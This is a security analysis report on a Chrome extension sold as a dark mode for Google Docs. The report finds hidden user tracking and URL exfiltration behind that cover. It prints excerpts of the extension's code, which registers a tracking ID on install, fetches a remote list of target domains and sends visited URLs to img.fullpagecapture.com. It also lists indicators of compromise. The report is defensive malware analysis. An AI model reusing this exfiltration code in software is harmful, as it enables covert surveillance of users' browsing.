# Security Analysis Report: Dark mode for Google™ docs

## Extension Metadata
- **Extension Name**: Dark mode for Google™ docs
- **Extension ID**: jjgfcpnblnoedjnepaapnonoklgafpfb
- **Estimated Users**: ~60,000
- **Manifest Version**: 3
- **Version**: 1.2.2

## Executive Summary

This extension poses **CRITICAL security and privacy risks**. While marketed as a simple dark mode theme for Google Docs, it contains a sophisticated data exfiltration infrastructure that:

1. **Generates and registers unique user tracking IDs** with a third-party domain (`img.fullpagecapture.com`)
2. **Implements remote configuration fetching** to enable surveillance on specific domains
3. **Exfiltrates browsing data** including full URLs with paths/parameters to external servers
4. **Uses overly broad permissions** (`<all_urls>` for both content scripts and host permissions) far exceeding dark mode functionality needs
5. **Deceptive branding** - the popup HTML references "LinkLeadSpy" (a LinkedIn data scraping tool), not dark mode functionality

The extension's background script establishes persistent tracking infrastructure and URL monitoring capabilities that have nothing to do with CSS theming.

## Vulnerability Details

### CRITICAL: User Tracking and Registration System

**Severity**: CRITICAL
**Files**: `background/background.js` (lines 3-104)
**MITRE ATT&CK**: T1056 (Input Capture), T1082 (System Information Discovery)

**Description**: The extension generates a unique GUID for each user on install and registers it with `img.fullpagecapture.com`:

```javascript
function guidGenerator() {
  const S4 = function () {
    return (((1 + Math.random()) * 0x10000) | 0).toString(16).substring(1);
  };
  return (S4() + S4() + '-' + S4() + '-' + S4() + '-' + S4() + '-' + S4() + S4() + S4());
}

function registerScreenshot(extensionId) {
  const apiUrl = `${baseUrl}/api/screenshot`;
  const requestData = { token: extensionId };
  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(requestData)
  })
}

chrome.runtime.onInstalled.addListener(function (details) {
  const extensionId = guidGenerator();
  if (details.reason === 'install') {
    chrome.storage.local.set({ extensionId: extensionId }).then(() => {
      registerScreenshotAfterStorage();
    });
  }
});
```

**Verdict**: MALICIOUS. The extension establishes a persistent tracking identifier and phones home to a third-party domain with no legitimate dark mode purpose. The function name "registerScreenshot" suggests screenshot exfiltration capabilities.

---

### CRITICAL: Remote Configuration and Domain Surveillance

**Severity**: CRITICAL
**Files**: `background/background.js` (lines 163-187, 106-161)
**MITRE ATT&CK**: T1071 (Application Layer Protocol), T1102 (Web Service)

**Description**: The extension fetches a remote configuration of domains to monitor:

```javascript
chrome.storage.local.get('extensionId', function (items) {
  const apiUrl = `${baseUrl}/api/features`;
  const requestData = { token: items.extensionId };
  fetch(apiUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(requestData)
  })
    .then(response => {
      if (response.ok) {
        return response.json();
      } else {
        return null;
      }
    })
    .then(modal => {
      if (modal?.length > 0) {
        chrome.storage.local.set({ modal: modal });
      }
    })
});
```

When a user visits a domain in this "modal" list, the extension exfiltrates the full URL:

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  const { status } = changeInfo;
  if (status === 'complete') {
    chrome.storage.local.get('modal', function (items) {
      const modal = items.modal || [];
      if (modal?.length > 0) {
        const hname = getHName(tab?.url);
        const tu = tab.url ? new URL(tab?.url) : '';
        if (!tu) return;

        const origin = tu.origin;
        const path = tu.pathname;
        const uri = origin + path;
        if (modal.includes(hname)) {
          const apiUrl = baseUrl + '/api/status';
          const requestData = { uri };
          fetch(apiUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestData)
          })
```

**Verdict**: MALICIOUS. This is a remote kill switch/configuration system that allows the operator to dynamically enable surveillance on arbitrary domains. The extension sends full URL paths (potentially including sensitive parameters) to `img.fullpagecapture.com`.

---

### CRITICAL: Deceptive Extension Branding

**Severity**: CRITICAL
**Files**: `index.html` (line 1)
**MITRE ATT&CK**: T1027 (Obfuscated Files or Information)

**Description**: The popup HTML contains a title tag that references a completely different product:

```html
<meta name="description" content="Find LinkedIn email IDs of any Profile"/>
<title>LinkLeadSpy</title>
```

**Verdict**: MALICIOUS. The extension's popup is branded as "LinkLeadSpy" (a LinkedIn scraping tool), not as a dark mode extension. This suggests the extension is either:
1. Reused malware from another extension
2. Deliberately hiding its true functionality
3. Part of a larger surveillance operation

---

### HIGH: Excessive Permissions

**Severity**: HIGH
**Files**: `manifest.json` (lines 18-30)
**MITRE ATT&CK**: T1098 (Account Manipulation)

**Description**: The extension requests:
- `host_permissions: ["<all_urls>"]` - access to all websites
- `content_scripts.matches: ["<all_urls>"]` - injection into all pages
- `permissions: ["storage", "notifications"]`

**Verdict**: SUSPICIOUS. A dark mode extension for Google Docs should only request:
- `host_permissions: ["https://docs.google.com/*"]`
- Content script injection only on Google Docs domains

The `<all_urls>` permission allows the extension to read/modify data on banking sites, email, social media, etc.

---

### MEDIUM: Legitimate Dark Mode Functionality

**Severity**: MEDIUM (False Positive for malware, but still concerning)
**Files**: `content/content.js`, `css/global.css`, `css/page.css`
**MITRE ATT&CK**: N/A

**Description**: The extension does implement actual dark mode functionality:
- Injects CSS stylesheets for dark theming
- Creates overlay div with opacity control
- Responds to toggle messages from popup
- Targets Google Docs-specific selectors

**Verdict**: LEGITIMATE but SUSPICIOUS context. The dark mode functionality is real, but it serves as cover for the surveillance infrastructure. This is a classic "trojan horse" pattern - deliver some legitimate functionality while hiding malicious code.

---

## False Positive Analysis

| Pattern | Location | Verdict | Reason |
|---------|----------|---------|--------|
| React DOM manipulation | `static/js/main.07b8056e.js` | FALSE POSITIVE | Standard React/Material-UI library code for building popup UI |
| `document.createElement` in content script | `content/content.js` lines 67-80 | FALSE POSITIVE | Creating overlay div for dark mode opacity effect |
| Chrome storage API usage | Throughout | FALSE POSITIVE (context-dependent) | Storing user preferences is legitimate; storing tracking IDs is malicious |
| CSS injection via chrome.runtime.getURL | `content/content.js` lines 24 | FALSE POSITIVE | Standard method for injecting extension CSS |

## API Endpoints and External Communications

| Endpoint | Purpose | Data Transmitted | Risk Level |
|----------|---------|------------------|------------|
| `https://img.fullpagecapture.com/api/screenshot` | User registration | Unique tracking GUID | CRITICAL |
| `https://img.fullpagecapture.com/api/features` | Remote config fetch | User tracking ID | CRITICAL |
| `https://img.fullpagecapture.com/api/status` | URL exfiltration | Full URL paths (origin + pathname) | CRITICAL |
| Dynamic URLs from `dshot` field | Unknown payloads | Unknown (follows redirects) | CRITICAL |

## Data Flow Summary

```
User Installs Extension
    ↓
Generate Unique GUID
    ↓
POST to img.fullpagecapture.com/api/screenshot (tracking ID)
    ↓
POST to img.fullpagecapture.com/api/features (fetch domain list)
    ↓
Store domain list in chrome.storage.local['modal']
    ↓
On Tab Update (any site):
    - Check if domain matches surveillance list
    - If match: POST full URL to img.fullpagecapture.com/api/status
    - Receive redirect URL ('dshot' field)
    - Send message to content script with redirect URL
```

**Privacy Impact**: Every URL visited on monitored domains is sent to a third-party server. This could include:
- Banking session URLs
- Email message IDs
- Social media profile URLs
- Confidential document links
- Search queries in URL parameters

## Overall Risk Assessment

**RISK LEVEL: HIGH**

### Risk Scoring:
- **Data Exfiltration**: CRITICAL (10/10) - Full URL tracking to external domain
- **Remote Control**: CRITICAL (10/10) - Dynamic domain surveillance list
- **Permissions Abuse**: HIGH (8/10) - `<all_urls>` far exceeds stated purpose
- **Deceptive Behavior**: CRITICAL (10/10) - Misbranded as LinkLeadSpy
- **Persistence**: MEDIUM (6/10) - Uses chrome.storage, no filesystem access

### Recommendations:
1. **IMMEDIATE REMOVAL** - Users should uninstall immediately
2. **REPORT TO GOOGLE** - Extension violates Chrome Web Store policies (deceptive behavior, privacy violations)
3. **FORENSIC ANALYSIS** - Investigate `img.fullpagecapture.com` infrastructure
4. **USER NOTIFICATION** - All 60,000 users should be warned about data collection

### Chrome Web Store Policy Violations:
- **Deceptive Installation Tactics** - Misrepresents functionality (dark mode vs. surveillance)
- **Use of Permissions** - Requests overly broad permissions
- **User Data Privacy** - Collects browsing data without disclosure
- **Single Purpose** - Extension serves multiple purposes (theming + tracking)

## Indicators of Compromise (IOCs)

**Domains:**
- `img.fullpagecapture.com` (C2 server)

**Extension Artifacts:**
- localStorage key: `extensionId` (tracking GUID)
- localStorage key: `modal` (surveillance domain list)
- HTML title: "LinkLeadSpy" in popup

**Behavioral Indicators:**
- Network POST requests to `/api/screenshot`, `/api/features`, `/api/status` on unknown domains
- Tab URL monitoring across all websites despite being a Google Docs-only tool

---

## Conclusion

This extension implements a sophisticated surveillance infrastructure disguised as a dark mode tool. The combination of remote configuration, user tracking, URL exfiltration, and deceptive branding indicates malicious intent.
